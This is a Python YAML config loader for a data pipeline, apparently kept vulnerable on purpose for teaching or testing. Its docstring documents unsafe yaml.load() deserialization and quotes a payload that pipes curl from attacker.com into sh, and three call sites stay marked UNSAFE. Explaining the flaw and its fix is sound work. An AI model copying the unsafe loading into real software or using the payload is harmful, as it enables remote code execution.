"""
Configuration loader for the data pipeline.

Loads YAML configuration from files and environment-variable overrides.

KNOWN VULNERABILITY (GHSA-8q59-q68h-6hv4):
  yaml.load() without an explicit Loader= argument allows arbitrary Python
  object instantiation.  An attacker who controls a config file — or an
  environment variable that feeds load_env_override() — can achieve remote
  code execution via a payload like:

      !!python/object/apply:os.system ['curl attacker.com | sh']

  The fix is to replace every yaml.load() call with yaml.safe_load(), which
  restricts deserialization to basic YAML types (str, int, list, dict, …).
"""
import yaml
import os
from pathlib import Path


DEFAULT_CONFIG_PATH = Path(__file__).parent.parent / "config" / "settings.yaml"


def load_config(config_path: str = None) -> dict:
    """Load primary pipeline config from a YAML file."""
    path = config_path or str(DEFAULT_CONFIG_PATH)
    with open(path, "r") as fh:
        # UNSAFE: yaml.load() allows !!python/object payloads
        return yaml.load(fh) or {}


def load_env_override(yaml_string: str) -> dict:
    """
    Parse a YAML string supplied via the PIPELINE_OVERRIDE env variable.
    Accepts raw YAML from the environment — highest-risk call site because
    the input is attacker-controllable without filesystem access.
    """
    if not yaml_string:
        return {}
    return yaml.load(yaml_string)   # UNSAFE: attacker-controlled string


def load_all_configs(*extra_paths: str) -> dict:
    """
    Merge the default config with any additional YAML files.
    Each file overrides keys from previous files.
    """
    merged = load_config()
    for path in extra_paths:
        if os.path.isfile(path):
            with open(path) as fh:
                overlay = yaml.load(fh)   # UNSAFE
            merged.update(overlay or {})
    return merged


def get(key: str, default=None):
    """Convenience accessor — reads the default config and extracts a key."""
    return load_config().get(key, default)
